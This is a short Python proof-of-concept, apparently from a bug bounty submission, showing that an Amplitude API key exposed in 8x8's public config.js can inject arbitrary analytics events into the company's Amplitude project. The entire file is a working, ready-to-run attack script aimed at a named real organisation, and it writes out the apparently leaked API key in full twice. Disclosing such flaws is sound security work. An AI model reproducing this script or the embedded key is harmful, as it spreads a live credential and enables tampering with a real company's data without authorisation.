#!/usr/bin/env python3
"""
PoC: Amplitude API Key Abuse — Arbitrary Event Injection
Source: https://8x8.vc/config.js (public, no auth)
Leaked Key: 28def3fe82bf211f5ec8c02e89dfaa1d

Demonstrates that the leaked Amplitude API key can be used to
inject arbitrary analytics events into 8x8's Amplitude project.

Author: Bug Bounty Researcher
"""

import requests
import sys

AMPLITUDE_URL = "https://api2.amplitude.com/2/httpapi"
LEAKED_KEY = "28def3fe82bf211f5ec8c02e89dfaa1d"
SOURCE_URL = "https://8x8.vc/config.js"


def inject_event():
    print("[*] 8x8 Amplitude API Key — Event Injection PoC")
    print(f"[*] Key source: {SOURCE_URL}")
    print(f"[*] Key: {LEAKED_KEY}\n")

    payload = {
        "api_key": LEAKED_KEY,
        "events": [{
            "event_type": "poc_test_unauthorized_event",
            "user_id": "poc_test_user",
            "event_properties": {
                "source": "security_research",
                "target": "8x8",
                "poc": True
            },
            "user_properties": {
                "injected_by": "bounty_hunter_poc"
            }
        }]
    }

    print(f"[*] Sending event: {payload['events'][0]['event_type']}")
    r = requests.post(AMPLITUDE_URL, json=payload, timeout=10)

    if r.status_code == 200:
        result = r.json()
        if result.get("events_ingested", 0) > 0:
            print(f"[+] SUCCESS — {result['events_ingested']} event(s) ingested")
            print(f"[+] Server upload time: {result.get('server_upload_time')}")
            print(f"[+] Payload size: {result.get('payload_size_bytes')} bytes")
            print("\n[!] Impact: Attacker can inject arbitrary analytics events")
            print("[!] into 8x8's Amplitude project, polluting analytics data")
            return True
        else:
            print(f"[-] Event not ingested: {r.text}")
    else:
        print(f"[-] Request failed: {r.status_code} {r.text}")

    return False


if __name__ == "__main__":
    success = inject_event()
    sys.exit(0 if success else 1)
